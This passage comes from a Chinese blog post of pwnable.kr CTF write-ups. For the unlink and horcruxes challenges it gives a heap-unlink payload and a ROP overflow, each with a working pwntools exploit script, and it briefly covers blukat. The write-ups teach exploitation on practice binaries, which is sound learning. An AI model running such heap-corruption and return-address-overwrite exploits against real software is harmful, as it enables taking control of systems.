+<p>0    4    8       16       24<br>+—-+—-+——–+——–+—-<br> fd  bk  buf     <heap>  fd<br>+—-+—-+——–+——–+—-</p>
+<p>payload 从 A 的 buf 开始算</p>
+<p>A+0x8  AAAA<br>A+0xc  AAAA<br>A+0x10 AAAA<br>A+0x14 AAAA<br>A+0x18 &lt;A的堆地址+0x28&gt;    &#x2F;&#x2F; OBJ 对象 B，同时也是 B 的 fd<br>A+0x1c &lt;A的栈地址-0x1c&gt;<br>A+0x20 \xeb\x84\x04\x08<br>A+0x24 &lt;A的堆地址+0x24&gt;<br>A+0x28 &lt;A的堆地址+0x24&gt;</p>
+<p>A的栈地址减去 0x1c 正好就是 unlink 函数中 main 的 ebp 保存的位置，\xeb\x84\x04\x08 是 shell 函数的地址，后面两个地址则是在上面 main 函数 ebp 的两次跳转中用到。 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> \* <span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.log\_level = <span class="string">&#x27;debug&#x27;</span> conn = process(<span class="string">&#x27;/home/unlink/unlink&#x27;</span>) stack = conn.recvregex(<span class="string">&#x27;here is stack address leak: 0x(\[a-f0-9\]+)\\n&#x27;</span>).decode() stack\_addr = <span class="built_in">int</span>(re.search(<span class="string">&#x27;here is stack address leak: 0x(\[a-f0-9\]+)&#x27;</span>, stack).groups()\[<span class="number">0</span>\], <span class="number">16</span>) heap = conn.recvregex(<span class="string">&#x27;here is heap address leak: 0x(\[a-f0-9\]+)\\n&#x27;</span>).decode() heap\_addr = <span class="built_in">int</span>(re.search(<span class="string">&#x27;here is heap address leak: 0x(\[a-f0-9\]+)&#x27;</span>, heap).groups()\[<span class="number">0</span>\], <span class="number">16</span>) <span class="built_in">print</span> stack\_addr, heap\_addr</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">&#x27;now that you have leaks, get shell!&#x27;</span>) d = <span class="string">&#x27;A&#x27;</span>\*<span class="number">16</span> d += p32(heap\_addr + <span class="number">0x28</span>) d += p32(stack\_addr - <span class="number">0x1c</span>) d += p32(<span class="number">0x80484eb</span>) d += p32(heap\_addr + <span class="number">0x24</span>) d += p32(heap\_addr + <span class="number">0x24</span>) conn.sendline(d) conn.interactive()</span><br></pre></td></tr></table></figure></p>
+<h2 id="blukat"><a href="#blukat" class="headerlink" title="blukat"></a>blukat</h2><p>脑筋急转弯式的题目，因为 blukat 用户已经设置到 blukat_pwn 组里了，password 文件一开始就有读取权限，只不过输出的文件内容很有迷惑性……所以读出来然后输入就好了，代码还故意留了个缓冲区溢出的幌子。</p>
+<h2 id="horcruxes"><a href="#horcruxes" class="headerlink" title="horcruxes"></a>horcruxes</h2><p>代码初始化了一堆随机值然后要求输入的值等于它们的总和，显然生成随机数没漏洞的话肯定是办不到的。然后 ropme 函数里有一段看似可以利用的代码，可以溢出后覆盖函数返回地址跳转到箭头处执行。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123; <span class="built_in">printf</span>(<span class="string">&quot;How many EXP did you earned? : &quot;</span>); <span class="built_in">gets</span>(s); <span class="comment">// char s\[100\]; if ( atoi(s) == sum ) &#123; =&gt; fd = open(&quot;flag&quot;, 0); s\[read(fd, s, 0x64u)\] = 0; puts(s); close(fd); exit(0); &#125; puts(&quot;You&#x27;d better get more experience to kill Voldemort&quot;); &#125;</span></span><br></pre></td></tr></table></figure> 但实际上因为</p>
+<p>fd &#x3D; open(“flag”, 0);</p>
+<p>所在地址是 0x80a010b，包含的 0a 正好是换行符会被 gets 截断所以行不通。 正好代码中有 A - G 七个函数会打印出各个随机数的值，而且它们的函数地址也没有特殊字符，所以可以分别返回到这些函数里，算出 sum 后输入即可。 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -\*- coding: utf-8 -\*- from pwn import \* import re</span></span><br><span class="line"></span><br><span class="line">context.log\_level = <span class="string">&#x27;debug&#x27;</span> <span class="comment">#conn = process(&#x27;/home/horcruxes/horcruxes&#x27;) conn = remote(&#x27;127.0.0.1&#x27;, 9032) conn.recvuntil(&#x27;Select Menu:&#x27;) conn.sendline(&#x27;0&#x27;) conn.recvuntil(&#x27;How many EXP did you earned? :&#x27;) p = &#x27;a&#x27;\*120 p += p32(0x809fe4b) # A 的函数地址 p += p32(0x809fe6a) # B p += p32(0x809fe89) # C p += p32(0x809fea8) # D p += p32(0x809fec7) # E p += p32(0x809fee6) # F p += p32(0x809ff05) # G p += p32(0x809fffc) # main() 中调用 ropme() 的地址，因为 ropme 的入口地址含 0a conn.sendline(p)</span></span><br><span class="line"></span><br><span class="line">data = conn.recv(<span class="number">1024</span>) data = conn.recv(<span class="number">1024</span>) data = conn.recv(<span class="number">1024</span>, timeout=<span class="number">5.0</span>) <span class="built_in">print</span> <span class="string">&#x27;data:&#x27;</span>, data exp = re.findall(<span class="string">&#x27;EXP \\+(-?\\d+)&#x27;</span>, data, re.S) <span class="built_in">print</span> <span class="string">&#x27;exp:&#x27;</span>, exp <span class="built_in">sum</span> = <span class="number">0</span> <span class="keyword">for</span> e <span class="keyword">in</span> exp: <span class="built_in">sum</span> += <span class="built_in">int</span>(e) <span class="built_in">print</span> <span class="string">&#x27;sum=&#x27;</span>, <span class="built_in">sum</span> &amp; <span class="number">0xffffffff</span> conn.interactive()</span><br></pre></td></tr></table></figure></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>flandre
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://kerisa.github.io/1658/" title="pwnable.kr 练习（二）">https://kerisa.github.io/1658/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/pwnable-kr/" rel="tag"># pwnable.kr</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/1640/" rel="prev" title="pwnable.kr 练习（一）">
+      <i class="fa fa-chevron-left"></i> pwnable.kr 练习（一）
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/1685/" rel="next" title="ZIP 明文攻击原理">
+      ZIP 明文攻击原理 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Toddler%E2%80%99s-Bottle"><span class="nav-number">1.</span> <span class="nav-text">Toddler’s Bottle</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#leg"><span class="nav-number">1.1.</span> <span class="nav-text">leg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mistake"><span class="nav-number">1.2.</span> <span class="nav-text">mistake</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shellshock"><span class="nav-number">1.3.</span> <span class="nav-text">shellshock</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#coin1"><span class="nav-number">1.4.</span> <span class="nav-text">coin1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#blackjack"><span class="nav-number">1.5.</span> <span class="nav-text">blackjack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lotto"><span class="nav-number">1.6.</span> <span class="nav-text">lotto</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cmd1"><span class="nav-number">1.7.</span> <span class="nav-text">cmd1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cmd2"><span class="nav-number">1.8.</span> <span class="nav-text">cmd2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#uaf"><span class="nav-number">1.9.</span> <span class="nav-text">uaf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#memcpy"><span class="nav-number">1.10.</span> <span class="nav-text">memcpy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#asm"><span class="nav-number">1.11.</span> <span class="nav-text">asm</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unlink"><span class="nav-number">1.12.</span> <span class="nav-text">unlink</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#blukat"><span class="nav-number">1.13.</span> <span class="nav-text">blukat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#horcruxes"><span class="nav-number">1.14.</span> <span class="nav-text">horcruxes</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt=""
+      src="/sys-imgs/42553027_1.png">
+  <p class="site-author-name" itemprop="name"></p>
+  <div class="site-description" itemprop="description">This is a mirror/backup site of flandre-scarlet.moe. It serves as a fallback when the original site is inaccessible.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">102</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">247</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">flandre</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">328k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">4:58</span>
+</div>
+  <div class="powered-by">Powered by love
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
